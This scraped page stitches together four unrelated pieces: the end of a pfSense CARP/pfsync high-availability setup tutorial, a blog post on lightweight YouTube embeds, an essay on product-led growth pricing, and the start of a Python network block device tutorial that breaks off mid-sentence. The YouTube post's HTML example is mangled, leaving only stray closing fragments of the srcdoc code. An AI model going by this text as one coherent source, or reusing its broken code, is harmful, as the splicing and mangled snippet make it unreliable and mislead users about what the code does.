<ul><li><strong>Network net</strong>: 192.168.99.0/24</li><li><strong>pfSense A IP</strong>: 192.168.99.1</li><li><strong>pfSense B IP</strong>: 192.168.99.2</li><li><strong>CARP Virtual IP</strong>: 192.168.99.100</li></ul>



<p><span>WAN</span>:</p>



<ul><li><strong>Network net</strong>: 192.168.1.0/24</li><li><strong>pfSense A IP</strong>: 192.168.1.1</li><li><strong>pfSense B IP</strong>: 192.168.1.2</li><li><strong>CARP Virtual IP</strong>: 192.168.1.100</li></ul>



<h2>How it works</h2>



<p>The high-availability techniques includes 3 main components:</p>



<ul><li><strong>CARP</strong> : a protocol for configuring a virtual IP which is used by pfSense. This virtual IP is taken over by the secondary server if the primary server encounters a problem.</li><li><strong>pfsync</strong> : a protocol used to synchronize the status of current connections between two pfSense servers (and more globally between two servers running <em>Packet Filter</em>).</li><li><strong>XML-RPC</strong> : a protocol for replicating data from one server to another. It is used in pfSense to replicate the configuration from the primary server to the secondary server.</li></ul>



<h2>1. Configuring virtual IPs</h2>



<p>In order to function, each pfSense server must have an unique IP address on its interface, as well as a virtual IP address which will be shared between the two pfSense servers.</p>



<p><strong>Therefore, pfSense needs 3 IP addresses per network.</strong></p>



<p>On the primary server, navigate to Firewall &gt; Virtual IPs :</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-virtual-ip-pfsense-provya.png" alt=""><figcaption>[pfSense] Firewall &gt; Virtual IPs</figcaption></figure></div>



<p>Click on the “<strong><span>+ Add</span></strong>” button.<br>The fields to be filled in are the following:</p>



<ul><li><strong>Type</strong>: CARP</li><li><strong>Interface</strong>: WAN</li><li><strong>Address(es)</strong>: the virtual IP with the mask of this interface. In our case: 192.168.1.100/24</li><li><strong>Virtual IP Password</strong>: a password…</li><li><strong>VHID Group</strong>: let pfSense choose it. It should be unique per virtual IP</li><li><strong>Advertising frequency</strong>: let pfSense choose it. The “base” field is the advertising frequency in second. The “skew” field is the <em>phase shift</em>. 0 means usually primary server.</li></ul>

<p>We perform the same configuration on the LAN interface.</p>

<p>Once done click on the “Apply Changes” button.</p>



<p>We can check the status of our virtual IP addresses from the menu Status&gt; CARP (failover):</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/menu-VIP-status-CARP-pfsense-provya.png" alt=""><figcaption>[pfSense] Status &gt; CARP (failover)</figcaption></figure></div>



<p>Both WAN and LAN virtual IP addresses are “<strong>Master</strong>“:</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya.png 578w, https://www.provya.com/blog/wp-content/uploads/2020/09/failover-status-vip-pfsense-provya-300x73.png 300w" sizes="(max-width: 578px) 100vw, 578px"><figcaption>[pfSense] CARP Status</figcaption></figure></div>



<p><strong>All these configurations about virtual IPs must be performed on the primary pfsense (pfSense A) only</strong>.</p>



<h2>2. Forcing the use of virtual IP addresses</h2>



<p>The virtual IPs are configured but not used.</p>



<p>To do this, we need to configure pfSense to use the WAN VIP address for outbound traffic, the LAN VIP address for inbound traffic, and configure the different services to work with the LAN VIP address as the default address (for OpenVPN or DHCP configuration, for example).</p>



<p><strong>All these configurations must be performed on the primary pfsense (pfSense A) only</strong>.</p>



<h3><span>Configuring Outbound NAT</span></h3>



<p>Got to Firewall &gt; NAT, Outbound tab.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya.png 489w, https://www.provya.com/blog/wp-content/uploads/2020/10/menu-firewall-nat-outbound-pfsense-provya-300x148.png 300w" sizes="(max-width: 489px) 100vw, 489px"><figcaption>[pfSense] Firewall &gt; NAT, Outbound tab</figcaption></figure></div>



<p>Check the button called “Hybrid Outbound NAT rule generation. (Automatic Outbound NAT + rules below)”. Then click on <strong>Add</strong> button.</p>



<p>The fields to be filled in are the following:</p>



<ul><li><strong>Interface</strong>: WAN</li><li><strong>Address Family</strong>: IPv4</li><li><strong>Protocol</strong>: any</li><li><strong>Source</strong>: Network – 192.168.1.0/24 (<em>i.e.</em> the LAN subnet)</li><li><strong>Destination</strong>: Any</li><li><strong>Address (Translation)</strong>: 192.168.1.100 (<em>i.e.</em> the VIP address on the WAN interface)</li></ul>

<p>Once done we click on the “Apply Changes” button.</p>



<h3><span>Configuring DHCP Server</span></h3>



<p>If pfSense is the DHCP server on the network, we are going the change its configuration. We go to Services &gt; DHCP Server.</p>



<p>We modify the “Gateway” field to indicate the VIP address (192.168.99.100).</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya.png 508w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-dhcp-server-configuration-pfsense-provya-300x66.png 300w" sizes="(max-width: 508px) 100vw, 508px"><figcaption>[pfSense] Gateway field on DHCP server configuration page</figcaption></figure></div>

<h3><span>Configuring OpenVPN Server</span></h3>



<p>If an OpenVPN server is configured on the pfSense, we modify the service listening interface (normally “WAN”) to replace it with the VIP address (192.168.1.100).<br>This modification is done in VPN &gt; OpenVPN, Servers tab.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya.png 397w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-openvpn-server-configuration-pfsense-provya-300x153.png 300w" sizes="(max-width: 397px) 100vw, 397px"><figcaption>[pfSense] Listening interface on OpenVPN server configuration page</figcaption></figure></div>

<h3><span>Configuring VPN IPsec Service</span></h3>



<p>If an IPsec tunnel is configured on the pfSense, it is necessary to modify the IPsec VPN listening interface (normally “WAN”) to replace it with the VIP address (192.168.1.100).<br>This modification is done in VPN &gt; IPsec, then in the phase 1 part.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya.png 474w, https://www.provya.com/blog/wp-content/uploads/2020/10/carp-ipsec-configuration-pfsense-provya-300x177.png 300w" sizes="(max-width: 474px) 100vw, 474px"><figcaption>[pfSense] Listening interface on IPsec – phase 1 configuration page</figcaption></figure></div>

<p>We have cover the main services impacted with virtual IPs.</p>



<h2>3. Configuring the High Availability</h2>



<p>We still have to configure the high availability service.</p>



<p>Go to System &gt; High Avail. Sync:</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/menu-system-high-availability-sync-pfsense-provya.png" alt=""><figcaption>[pfSense] System &gt; High Avail. Sync</figcaption></figure></div>



<p>On this page there are two things to configure: <strong>pfsync</strong> (states synchronization) and <strong>XMLRPC Sync</strong> (configuration synchronization).</p>



<h3><span>State Synchronization Settings (pfsync)</span></h3>



<p>The fields to be filled in are the following:</p>



<ul><li><strong><u>Synchronize States</u></strong>: check this case to activate pfsync.</li><li><strong><u>Synchronize Interface</u></strong>: if you don’t have a dedicated interface for the synchronization between the two nodes, just choose “LAN”. That’s what we do in our case.</li><li><strong><u>pfsync Synchronize Peer IP</u></strong>: the IP address of the pfSense B. In our case: 192.168.99.2</li></ul>



<h3><span>Configuration Synchronization Settings (XMLRPC Sync)</span></h3>



<p>The fields to be filled in are the following:</p>



<ul><li><strong><u>Synchronize Config to IP</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the IP of the secondary pfSense (pfSense B). In our case: <strong>192.168.99.2</strong>. Keep in mind that it must be the same IP that you entered previously in the “pfsync Synchronize Peer IP” field. <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li><li><strong><u>Remote System Username</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the username to access to the secondary pfSense (pfSense B) – it should be “<strong>admin</strong>” by default. <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li><li><strong><u>Remote System Password</u></strong>: on the <strong>primary pfSense</strong> (pfSense A), enter the password of the admin account (or the alternate account you chose). <strong>This field must be left blank on the secondary pfSense (pfSense B)</strong>.</li></ul>



<p>Then we check the services we want to synchronize. The default is all services (click the <em>Toggle All</em> button).</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-417x1024.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-417x1024.png 417w, https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya-122x300.png 122w, https://www.provya.com/blog/wp-content/uploads/2020/10/high-availability-configuration-pfsense-provya.png 532w" sizes="(max-width: 417px) 100vw, 417px"><figcaption>[pfSense] High Availability configuration</figcaption></figure></div>



<p>Once done, click on the “Save” button.</p>



<h3><span>Allow replication flows in the firewall rules</span></h3>



<p>Last thing to do is to authorize the network flows for the replication process.</p>



<p>Go to Firewall &gt; Rules.</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/menu-firewall-rules-pfsense-provya.png" alt=""><figcaption>[pfSense] Firewall &gt; Rules</figcaption></figure></div>



<p>There are two network flows to allow:</p>



<ul><li>XML-RPC synchronization which is done on port 443.</li><li>pfsync protocol synchronization.</li></ul>



<p>The easiest way to do is to create an alias with the LAN IP addresses of the two pfSense servers :</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya.png 351w, https://www.provya.com/blog/wp-content/uploads/2020/12/alias-example-cluster-pfsense-provya-300x128.png 300w" sizes="(max-width: 351px) 100vw, 351px"><figcaption>[pfSense] Example of an alias</figcaption></figure></div>



<p>Then we create a firewall rule with the alias :</p>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya.png 603w, https://www.provya.com/blog/wp-content/uploads/2020/12/firewall-rule-for-ha-cluster-pfsense-provya-300x53.png 300w" sizes="(max-width: 603px) 100vw, 603px"><figcaption>[pfSense] An easy firewall rule for firewall synchronization</figcaption></figure></div>



<p><strong>Good news. The configuration is done!</strong></p>



<p>We can do some tests…</p>



<p>First of all, at this step, it is important to make a backup of your both pfSense servers (“Diagnostics” &gt; “Backup &amp; Restore”).</p>



<p>Then, to test the proper functioning of the high availability, several tests can be performed. Here are a few examples:</p>



<ul><li>stop the primary pfSense ;</li><li>disconnect the network cable from the LAN or WAN interface of the primary pfSense ;</li><li>disable the CARP service on the primary pfSense (“Status” &gt; “CARP (failover)”) ;</li><li>download a file or launch ping requests when switching from primary to secondary server</li></ul>

<h3><a href="https://rg3.name/202012062121.html">Embedding YouTube videos without making your site fatter</a></h3>
<p>Posted on <time>2020-12-06T21:21Z</time>. Updated on <time>2020-12-08T09:49Z</time>.</p>


<p>Making this site lighter and improving load times for my readers has been a
priority <a href="https://rg3.name/201704241948.html">for some years</a>. I’ve stopped embedding web
fonts, I’ve started using Unicode icons instead of relying on
<a href="https://fontawesome.com/">Font Awesome</a> and I’ve also
<a href="https://rg3.name/201711221902.html">started loading Disqus comments on demand</a>, which also
has a positive impact on the privacy of anyone reading these pages.</p>
<p>However, on a few occasions I’ve wanted to embed a YouTube video in one of the
posts, and I had never realized this can heavily impact page sizes and load
times. Take, for example, the following HTML document.</p>
<div>
<div>
<pre>&lt;html&gt;
&lt;head&gt;&lt;title&gt;Embedded YouTube Video&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;iframe
    width="1280"
    height="720"
    src="https://www.youtube.com/embed/ck7utXYcZng"
    frameborder="0"
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
    allowfullscreen&gt;
&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>
</div>
<p>The <code>iframe</code> code you see above is almost verbatim copied from the code YouTube
gives you when you right-click on the video and select “Copy embed code”. If
you store that document locally and try to open it with Firefox using its
network inspection tool, you’ll discover it attempts to load, as of the time
this text is being written, around 1.84MB of data, and that’s with
<a href="https://github.com/gorhill/uBlock">uBlock Origin</a> blocking some additional
requests. The largest piece of that being YouTube’s base Javascript library.</p>
<p><span><a href="https://rg3.name/img/youtube-embedded-weight.png"><img src="https://rg3.name/img/youtube-embedded-weight-tn.jpg" alt="Firefox network inspection tool showing the base YouTube Javascript library weighting 1.46MB"></a></span></p>
<p>On the one hand, it’s likely many people already have that file, and some
others, in their browser cache. On the other hand, I don’t feel comfortable
making that assumption and throwing my hands up. This prompted me to try to
find a way to embed YouTube videos without adding so much data by default, and
it turns out
<a href="https://css-tricks.com/lazy-load-embedded-youtube-videos/">other people
have found solutions to the problem</a>, which I’ve slightly tuned and I’m
re-sharing here. Instead of using the previous <code>iframe</code> code, I use something
slightly more convoluted.</p>

            &lt;span&gt;&amp;#x25b6;&lt;/span&gt;
        &lt;/a&gt;"
&gt;&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>

<p>The first few lines are almost identical up to the <code>src</code> property. I’ve only
added the <code>title</code> property for accessibility reasons. Special care needs to be
taken if the video title contains double quotes or single quotes. The <code>src</code>
property contains the classic URL but it’s only used as a fallback for browsers
that do not support the <code>srcdoc</code> property that starts on the next line.
<code>srcdoc</code> allows you to specify an inline document that will be used instead of
loading the frame from an external URL. Support for it is widespread nowadays.
As you can see, the embedded inline document contains a <code>style</code> element
followed by an <code>a</code> element pointing to the real embedded <code>iframe</code>, only this
time with the <code>autoplay</code> parameter set to 1, so the video will immediately
start playing when the frame is loaded.</p>
<p>The provided style sheet makes sure the link fills the entire embedded
<code>iframe</code>, so clicking anywhere on it loads the video and starts playing it.
Inside the link you’ll find 3 items. The first one is the video thumbnail in
YouTube’s “high quality” version, which is actually lightweight and gets the
job done as the background image. My guess is the name predates HD and FHD
content. On top of that image I’ve placed a <code>span</code> element with a black
background color and 75% opacity that, again, fills the whole <code>iframe</code> and
darkens the background image, making the play button stand out. Finally,
another <code>span</code> element is laid out on top of those, containing the Unicode
character for a triangle pointing to the right in a large font. This serves as
the aforementioned play button and gives readers the visual clue they need to
click on the video to start playing it.</p>
<p>With those changes and for this particular video, the browser only needs to
load around 9KB of data. You can see what it looks like below.</p>

        </a>"></iframe>
</p>
<p><strong>Edit 2020-12-08</strong>: The <code>autoplay</code> parameter is ignored by YouTube on mobile and
users will need to tap twice to watch the video: once to click on your link and
load the <code>iframe</code> and once more to start playing the video from it. Still, I
think double tapping is worth saving almost 2MB by default. On an iPad I only
need to tap once, so it depends on the exact device and what’s considered
“mobile”.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>We have been reading <a href="https://www.amazon.com/Product-Led-Growth-Build-Product-Itself-ebook/dp/B07P6288ZF/ref=sr_1_1?dchild=1&amp;keywords=product+led+growth&amp;qid=1607309625&amp;sr=8-1"><em>Product Led Growth: How to Build a Product that Sells Itself</em> by Wes Bush</a> as a Product team at <a href="https://www.armor.com/">Armor</a>. Because a team that learns together grows together. For some of us it is the first time reading this book since it was released in 2019 and for others we're re-reading it. But regardless of whether it is the first time through or a repeat read the book is yielding valuable insights and talking points amongst the team. There have been two areas of insights from the product-led growth framework presented in that book that I would like to explore in this blog post from these readings: the first is around the shift companies can take from best guess pricing strategies to value-based pricing for their customers; the second set of insights concerns the impact of a product-led growth strategy on onboarding and user engagement. </p><h2 id="value-based-pricing-strategies-for-saas-companies">Value-Based Pricing Strategies for SaaS companies </h2><figure><img src="https://www.writingbyryan.com/content/images/2020/12/bondsai-value-based-pricing-faq-capture-value.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/bondsai-value-based-pricing-faq-capture-value.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1000w, https://www.writingbyryan.com/content/images/size/w1600/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1600w, https://www.writingbyryan.com/content/images/2020/12/bondsai-value-based-pricing-faq-capture-value.png 1920w" sizes="(min-width: 720px) 720px"><figcaption>Value-Based Pricing</figcaption></figure><p>There have been many articles recently on <a href="https://www.forbes.com/sites/forbestechcouncil/2020/09/23/how-saas-companies-benefit-from-value-based-pricing/?sh=122ae9d21ebe">"How SaaS Companies Benefit from Value-Based Pricing"</a>. Specifically, the above slide on value-based pricing from bondsai.io does a good job of outlining the goal of value-based pricing strategies for companies, to align your price point in market to an area where the company captures market share, substantial revenue, and high profit margins, while the buyer or user gains considerable value for the price and feels as if they have gotten a good deal. This good deal can be measured as product-market fit where a user &nbsp;says they would be upset if they couldn't use your product anymore. TechCrunch described this as "<a href="https://techcrunch.com/2020/12/01/bottom-up-saas-a-framework-for-mapping-pricing-to-customer-value/">Bottom-Up SaaS: A framework for mapping pricing to customer value</a>". I believe the debate between bottom-up versus top-down sales growth is a bit of a misnomer and successful product-led SaaS companies should actually take a cue from Richard Hendricks from <a href="https://www.hbo.com/silicon-valley">HBO's <em>Silicon Valley</em></a> and adopt a middle-out strategy but that's for another post.</p><p>Wes Bush describes the evolutionary path companies go through on pricing as happening in 3 stages. First, companies use a best-guess strategy. This strategy can sometimes look at market guidance such as what competitors are doing but is generally what the founders or executive team feels is the right strategy based on their years of experience inn the industry. While this experience certainly matters to pricing discussions, it cannot be the determining factor in a company's strategy. Second, companies evolve to use cost + margin pricing. This adds a little more quantifiable approach to the strategy for the company as it looks at what it takes to run the business and seeks to add a comfortable profit margin for the company on top. However, this only creates value for the company and not for the customer necessarily. The company may be leaving money on the table because the customer experiences more value from the product than the arbitrary profit margin assigned by the business or the company may be overcharging based on the value the customers receive and start losing deals on price or experiencing increased churn due to perceived value not equating to experienced value. </p><p>The last stage of a companies pricing evolution though takes them to value-based pricing that is the best possible result for both the business and the buyer. The customer gains in whatever value metric they achieve with your product and you gain financially and with sticky users and substantial life-time value (LTV) from your customer base. For example, for social networks such as <a href="https://www.facebook.com/ArmorCloudSec">Facebook</a>, <a href="https://twitter.com/Armor">Twitter</a>, and <a href="https://www.linkedin.com/company/armor-cloud-security/">LinkedIn</a>, as well as workplace communication tools such as Slack the value metric is the number of users on the platform because the platform becomes more valuable to me when I can connect, communicate, and engage with more people. However, charging by user does not necessarily make sense for a cybersecurity company like Armor because the number of users does not affect the value a company receives from using our product. They do, however, get value out of the amount of coverage of their IT estate we can provide them so we can either charged by amount of infrastructure protected or the number of detections with corresponding remediation guidance we can provide in an environment because users get value out of how secure and/or compliant their business becomes when using <a href="https://www.armor.com/armor-anywhere-security/">Armor's security-as-a-service SaaS platform, Armor Anywhere</a>. It is important for companies to think about their pricing strategies using the value-based pricing framework laid out in <em>Product-Led Growth </em>as it will give them a competitive differentiation in market. </p><h2 id="how-onboarding-and-user-engagement-benefit-from-a-product-led-growth-strategy">How Onboarding and User Engagement Benefit from a Product-Led Growth Strategy</h2><figure><img src="https://www.writingbyryan.com/content/images/2020/12/2-product-led-growth-1024x577.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/2-product-led-growth-1024x577.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/2-product-led-growth-1024x577.png 1000w, https://www.writingbyryan.com/content/images/2020/12/2-product-led-growth-1024x577.png 1024w" sizes="(min-width: 720px) 720px"><figcaption>Product-Led Growth and User Experience from PQL to Increasing Customer LTV</figcaption></figure><p>A big part of <em>Product-Led Growth</em> is how companies who adopt this strategy can benefit across the customer lifecycle journey from getting more qualified leads who are likely to spend more with the product to converting those leads into lifelong customers who keep spending and increasing their engagement with the product. It starts by saying companies should use their marketing initiatives to funnel people directly into a free trial or freemium experience of the product and use those initial customer touches with the product to generate product qualified leads (PQLs) that ultimately convert into paying customers. The goal is to cut out the friction of previous software buying experiences...talking to sellers, sitting through demos, getting bombarded by endless marketing content before getting to even try the product. If your product does not make the user feel as if they are getting enough value out of their experience then you have not found product-market fit. If customers do experience value then they'll convert into paying customers. Also, customers are going to try the product eventually, so if they only try after they buy you are likely to see increased churn, bad press or customer reviews, etc when perceived value doesn't equal experienced value. Getting to these insights earlier in the customer lifecycle allows SaaS companies pinpoint which levers they need to pull to achieve product-market fit quicker. </p><p>After the customer is in the product funnel, has experienced a free trial, gotten value out of the product and converted to a paying customer it is the sales, product, and customer success teams duty to keep the user engaged from onboarding through every day usage to ensure that they continue to be successful with the product, see value out of using it, and continue to increase their engagement and spend so the company offering the product also continues to experience value and gain something from the relationship. This often manifests itself in cross-sell and up-sell opportunities and ways for the company to increase MRR and the TLV of a customer. These tactics also help prevent customer churn within a business. The end goal of every business should be that when a customer is using the product, experienced value = perceived value = value-based price-point that makes everyone smile.</p><figure><img src="https://www.writingbyryan.com/content/images/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png" alt="" srcset="https://www.writingbyryan.com/content/images/size/w600/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 600w, https://www.writingbyryan.com/content/images/size/w1000/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 1000w, https://www.writingbyryan.com/content/images/2020/12/5cf9445cd86db995dbdf3688_bowling-alley-framework-2.png 1024w" sizes="(min-width: 720px) 720px"><figcaption>Bowling Alley Framework for User Engagement Using Product-Led Growth</figcaption></figure><p>The above diagram is a great example of some of the ways a product-led growth strategies affects what the SaaS product's responsibility and what the Customer Success, Sales, and Marketing teams' responsibility is in affecting user engagement and LTV of their customer base. Businesses should imagine a bowling alley when thinking about how to make customers successful with their product. The goal of bowling is to guide the ball from your hand to the other end of the lane without going in the gutters and simultaneously knocking down as many pins as possible. Similarly, the goal of a product-led business should be to guide their customers (the ball) to the value they seek (the pins) by providing bumpers similar to how bowling lanes provide this assistance to customers who need it. </p><p>The book outlines two ways in which this happens, product bumpers (welcome messages, product tours, progress bars, checklists, tooltips, empty states, etc.) which are primarily the responsibility of the product itself and the product team to maintain and conversational bumpers (user onboarding emails, sales outreach, customer success outreach, direct mail, etc.) which fall to marketing, sales, and customer success generally even though there can be some cross-pollination of team responsibility across both sets of bumpers. The goal of each of the bumper strategy should be to just like bowling bumpers make the customer so confident in their own ability to achieve the value they seek that they no longer need the bumpers and can achieve strikes with your product all on their own. </p><p>By adopting a product-led growth company, SaaS companies can benefit in many areas. It can have transformative effects on areas other business such as pricing, onboarding and user engagement, and product growth. It recognizes that the product is the experience and that experience can drive a lot in terms of corporate strategy for a company. At Armor, we'll be looking to bring these insights into our product management and corporate strategy conversations and continue to look to build paths to value for our customers.

  <p><strong>With Python (30 - 40 mins read time)</strong></p><p>Welcome back to The Lambda Scheme. In our <a href="https://lambdascheme.com/QS.html" target="_blank" rel="noopener">last post</a> we reflected on the long history of classical computing and explored the mysterious new world of quantum algorithms. Now that we’ve amply flexed our philosopher muscles I thought we could spend this post doing something much more practical. We’re going to build some good ol’ cloud infrastructure from scratch. With Python! In particular, we’re going to build a cloud-ready block storage service, like a simplified version of <a href="https://aws.amazon.com/ebs/" target="_blank" rel="noopener">Amazon EBS</a> or <a href="https://wiki.openstack.org/wiki/Cinder" target="_blank" rel="noopener">OpenStack Cinder</a></p><p>Imagine you’re tasked with building Cinder. Where would you start? Building your own version of a system you use regularly is a great way to richen your understanding, both of the system itself and of general systems design principles. For those of you who are interviewing at a big tech co. like any FAANG, this post will follow a very similar flow to the “systems design” section of the interview so it’s good practice.</p><p>In <a href="#part-1-a-single-node-service">Part 1</a> we will learn:</p><ul>
<li>What a <a href="http://pineight.com/ds/block/" target="_blank" rel="noopener">block device</a> is from the perspective of the OS kernel</li>
<li>How we can store and mount an <a href="https://en.wikipedia.org/wiki/Extended_file_system" target="_blank" rel="noopener">extended filesystem</a> on a block device</li>
<li>How to build a simple <a href="https://en.wikipedia.org/wiki/Network_block_device" target="_blank" rel="noopener">Network Block Device</a> as a service</li>
</ul><p>In <a href="#part-2-a-multi-node-service">Part 2</a> we will uplevel our service for cloud scale by:</p><ul>
<li><a href="https://en.wikipedia.org/wiki/Replication_(computing)" target="_blank" rel="noopener">Replicating</a> our data for high availability</li>
<li><a href="https://en.wikipedia.org/wiki/Shard_(database_architecture)" target="_blank" rel="noopener">Sharding</a> our data for high throughput</li>
<li>Adding <a href="https://en.wikipedia.org/wiki/Leader_election" target="_blank" rel="noopener">leader election</a> for automatic failover</li>
</ul><p>Finaly in <a href="#part-3-measuring-performance">Part 3</a> we will see how our system actually performs by:</p><ul>
<li>Using it for a real-world scenario (backing a <a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a> database)</li>
<li>Adding observability like <a href="https://opentracing.io/" target="_blank" rel="noopener">system metrics</a> and <a href="https://docs.python.org/3/library/logging.html" target="_blank" rel="noopener">logging</a></li>
<li>Benchmarking our service against other block services</li>
</ul><p>Follow along with the source code <a href="https://github.com/ulmenhaus/lambdascheme/tree/master/nbd" target="_blank" rel="noopener">on github</a>. Let’s begin!</p><h2 id="part-1-a-single-node-service"><a href="#part-1-a-single-node-service" title="part-1-a-single-node-service"><i></i></a>Part 1: A Single Node Service</h2><h3 id="the-what-and-why-of-block-devices"><a href="#the-what-and-why-of-block-devices" title="the-what-and-why-of-block-devices"><i></i></a>The What and Why of Block Devices</h3><p>Block devices are the parts of any computer system that make it durable. They store all the state that a computer has when it boots, its operating system, its data, and its programs. Many things can be block devices, <a href="https://github.com/ulmenhaus/lambdascheme/tree/master/nbd" target="_blank" rel="noopener">rotating hard disk drives</a>, <a href="https://en.wikipedia.org/wiki/Solid-state_drive" target="_blank" rel="noopener">solid state drives</a>, older <a href="https://en.wikipedia.org/wiki/Magnetic_tape_data_storage" target="_blank" rel="noopener">magnetic tapes</a>, or whatever. The abstract idea of a “block device” caputres the common features across all these devices namely: they’re cheap, they’re big, and they’re <a href="https://en.wikipedia.org/wiki/Non-volatile_memory" target="_blank" rel="noopener">non-volatile</a>. Cheap and big basically mean the same thing; the cost per bit of a block device is much lower than that of RAM or CPU registers, so we can buy a lot more bits.</p><p>This cheapness and bigness comes at a cost. For <a href="https://en.wikipedia.org/wiki/CAS_latency" target="_blank" rel="noopener">hardware reasons we won’t go into</a>, the more storage a device has the longer it takes to retrieve any one piece of data. For block devices this cost is so high that you only want to pay it to retrieve a large amount of data, called a <strong>block</strong> (hence the name), at a time. Because the whole block is collocated on your storage device you pay the same overhead you would for a single byte but amortized over the size of the block, <a href="https://www.quora.com/What-is-the-block-size-in-unix#:~:text=The%20hardware%20block%20size%20on,be%20subdivided%20into%20512B%20segments." target="_blank" rel="noopener">typically 4KiB</a>.</p><p>One of the jobs of your operating system is to manage these blocks for you so that you, the application programmer don’t need to think about them. Your OS will have a myriad techniques for managing blocks efficiently. It may <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/ch15s01.html#:~:text=The%20page%20cache%20is%20the,from%20or%20writing%20to%20disk.&amp;text=If%20the%20page%20is%20not,data%20read%20from%20the%20disk." target="_blank" rel="noopener">cache them in memory</a> when it anticipates you’ll need them again soon, or it may <a href="https://www.linuxjournal.com/article/6931" target="_blank" rel="noopener">cleverly do disk reads</a> in sequence when it knows the blocks are close to each other on disk. When it comes time to actually retrieve or store your blocks it’s your OS, or more precisely the OS kernel with its privileged hardware access, that issues the request to your hard drive.</p><p><img src="https://storage.googleapis.com/bigendian/scsi.svg"></p><p>A common interface between your kernel and the device here is the <a href="https://en.wikipedia.org/wiki/SCSI" target="_blank" rel="noopener">SCSI</a> (pronounced “scuzzie”) protocol which we’ll meet again when we want to provide blocks as a network service. In short, say your program needs to fetch a block from your hard-drive, then your kernel will issue the drive a SCSI command like “read me block 42” and then copy the block into main memory for your program.</p><p>Blocks are a pain to deal with. They are fixed in size and use otherwise meaningless numbers like <code>0x34586209</code> as addresses. So from the perspective of an application program a kernel provides a more abstract and more friendly “file system” interface.</p><p><img src="https://storage.googleapis.com/bigendian/unix_files.svg"></p><p>With a file system we get a tree of directories and files which get to have meaningful names and can be of arbitrary size. Your kernel then translates operations on these files into storage and retrieval of blocks. As you can imagine, there are infinitely many ways the OS can do this mapping, but over time a handful have emerged as the most common, <a href="https://wiki.archlinux.org/index.php/ext4" target="_blank" rel="noopener">Ext4</a> on Linux, <a href="https://en.wikipedia.org/wiki/NTFS" target="_blank" rel="noopener">NTFS</a> on Windows, and <a href="https://en.wikipedia.org/wiki/Apple_File_System" target="_blank" rel="noopener">APFS</a> on Mac. Let’s look at a simple view of the disk layout for Ext4.</p><p><img src="https://storage.googleapis.com/bigendian/ext4.svg"></p><p>What Linux does is store all key attributes of the file system itself in the first block of the drive, called the super-block. At the other end of the drive we have all our file blocks. These contain the raw contents of individual files and directories. Sandwiched in between the superblock and the file blocks is a collection of <a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="noopener">inode</a> blocks.</p><p>Each inode stores metadata about an individual file or directory and can tell you which data blocks make up its contents. Inodes are how the kernel can actually index and assemble file blocks into a single file of arbitrary size. When we zoom into ext4 this process gets quite hairy, but we don’t have to think about that. File systems are built on block devices, so If we implement blocks as a network service we get ext4 for free.</p><p>Finally before starting to write our service let’s briefly understand why we would want network block devices instead of say a <a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="noopener">Network Filesystem</a> or blob storage like <a href="https://aws.amazon.com/s3/" target="_blank" rel="noopener">Amazon S3</a>. The truth is our needs depend on our application. For applications like storing photos which would have lots of 